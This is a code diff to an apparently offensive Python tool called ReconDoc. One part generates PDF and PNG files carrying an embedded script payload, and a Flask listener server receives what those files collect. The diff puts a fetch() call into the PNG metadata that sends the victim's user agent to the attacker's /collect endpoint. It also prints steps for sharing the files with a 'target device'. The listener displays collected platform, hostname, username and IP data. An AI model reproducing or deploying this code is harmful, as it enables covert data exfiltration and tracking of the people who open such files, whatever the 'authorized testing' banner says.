@@ -275,16 +275,16 @@ class PayloadGenerator:
                 # Create a basic image
                 output_image = os.path.join(self.output_dir, "image.png")
                 
-                # Create a simple image
+                # Create a simple image with text
                 img = Image.new('RGB', (800, 600), color='white')
                 
-                # Add metadata with the payload
-                metadata = {
-                    "Software": f"<script>fetch('{listener_url}/collect', {{method:'POST',body:JSON.stringify({{device:navigator.userAgent}})}});</script>"
-                }
+                # Add the payload in image metadata
+                from PIL.PngImagePlugin import PngInfo
+                metadata = PngInfo()
+                metadata.add_text("Description", f"<script>fetch('{listener_url}/collect',{{method:'POST',body:JSON.stringify({{device:navigator.userAgent}})}})</script>")
                 
                 # Save image with metadata
-                img.save(output_image, pnginfo=Image.PngInfo())
+                img.save(output_image, "PNG", pnginfo=metadata)
                 
                 progress.update(task, completed=True)
                 self.console.print(f"[green]✓[/green] Image payload created: {output_image}")
@@ -425,22 +425,39 @@ class ListenerServer:
                 # Format system information
                 self.console.print(Panel.fit(
                     "\n".join([
-                        f"[bold blue]System Information[/bold blue]",
-                        f"Platform: {data['system']['platform']} {data['system']['platform_release']}",
-                        f"Architecture: {data['system']['architecture']}",
-                        f"Hostname: {data['system']['hostname']}",
-                        f"Username: {data['system']['username']}\n",
-                        f"[bold blue]Network Information[/bold blue]",
-                        f"Public IP: {data['public_ip']}",
-                        f"Timezone: {data['timezone']}"
+                        f"[bold blue]Collected Information[/bold blue]",
+                        json.dumps(data, indent=2)
                     ]),
-                    title="[bold]Collected Information[/bold]",
+                    title="[bold]New Data Received[/bold]",
                     border_style="blue"
                 ))
                 
                 return jsonify({"status": "success", "message": f"Data saved to {filename}"}), 200
             except Exception as e:
                 return jsonify({"status": "error", "message": str(e)}), 500
+        
+        @app.route('/', methods=['GET'])
+        def index():
+            """Landing page with instructions"""
+            return '''
+            <html>
+                <head>
+                    <title>ReconDoc Server</title>
+                    <style>
+                        body { font-family: Arial, sans-serif; margin: 40px; }
+                        .container { max-width: 800px; margin: 0 auto; }
+                        .warning { color: red; }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <h1>ReconDoc Server</h1>
+                        <p class="warning">⚠️ For authorized testing only!</p>
+                        <p>Server is running and waiting for data...</p>
+                    </div>
+                </body>
+            </html>
+            ''', 200
         
         @app.route('/health', methods=['GET'])
         def health():
@@ -512,6 +529,9 @@ def wait_for_server(url, timeout=30):
 def run_all():
     """Run both server and payload generator"""
     from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    
     console = Console()
     
     # Start listener server
@@ -536,10 +556,44 @@ def run_all():
     
     if pdf_path or image_path:
         console.print("\n[bold green]Payloads created successfully![/bold green]")
+        
+        # Create a table to show payload locations
+        table = Table(title="Generated Payloads", show_header=True, header_style="bold magenta")
+        table.add_column("Type", style="dim")
+        table.add_column("Location", style="green")
+        table.add_column("Status", style="bold")
+        
+        if pdf_path:
+            table.add_row("PDF", pdf_path, "✓ Ready")
+        if image_path:
+            table.add_row("Image", image_path, "✓ Ready")
+            
+        console.print(table)
+        
         console.print("\n[bold yellow]Instructions:[/bold yellow]")
         console.print("1. Share the generated files with target device")
         console.print("2. When opened, data will be sent to this server")
         console.print("3. Press Ctrl+C to stop the server when done")
+        
+        # Show server URLs
+        urls = [
+            f"http://localhost:5000",
+            f"http://127.0.0.1:5000"
+        ]
+        
+        # Add local IP if available
+        try:
+            import socket
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            if local_ip != "127.0.0.1":
+                urls.append(f"http://{local_ip}:5000")
+        except:
+            pass
+            
+        console.print("\n[bold cyan]Server URLs:[/bold cyan]")
+        for url in urls:
+            console.print(f"  • {url}")
     
     # Keep the server running
     try:
